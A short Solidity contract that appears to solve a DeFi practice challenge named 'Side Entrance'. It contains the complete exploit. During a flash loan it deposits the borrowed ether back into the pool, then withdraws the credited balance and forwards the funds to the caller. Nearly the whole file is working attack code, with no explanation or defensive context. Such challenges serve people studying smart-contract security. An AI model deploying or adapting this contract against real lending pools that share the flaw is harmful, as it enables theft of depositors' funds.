// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceAttracker is IFlashLoanEtherReceiver {
    // flashloan callback
    function execute() external payable override {
        (bool isSuccess,) = msg.sender.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(isSuccess, "deposit fail");
    }

    // attact flashloan
    function attact(address pool, uint256 amount) external {
        // call flashloan
        (bool isSuccessAttact,) = pool.call(abi.encodeWithSignature("flashLoan(uint256)", amount));
        require(isSuccessAttact, "attact fail");

        // withdraw
        (bool isSuccessWithdraw,) = pool.call(abi.encodeWithSignature("withdraw()"));
        require(isSuccessWithdraw, "withdraw fail");

        // transfer back to attacker
        (bool isSuccessTransfer,) = msg.sender.call{value: amount}("");
        require(isSuccessTransfer, "transfer back fail");
    }

    receive() external payable {}
}
